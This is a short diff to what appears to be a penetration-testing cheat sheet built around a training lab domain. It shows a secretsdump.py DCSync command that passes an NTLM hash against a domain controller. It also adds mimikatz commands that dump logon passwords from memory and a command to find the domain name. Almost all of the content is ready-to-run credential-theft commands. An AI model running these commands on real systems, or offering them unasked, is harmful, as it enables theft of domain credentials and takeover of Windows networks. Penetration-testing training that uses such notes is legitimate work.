@@ -217,3 +217,13 @@ Use Domain Controller hash to DCSync
 secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
 ```
 
+mimikatz
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+find domain name
+```
+systeminfo | findstr /B "Domain"
+```
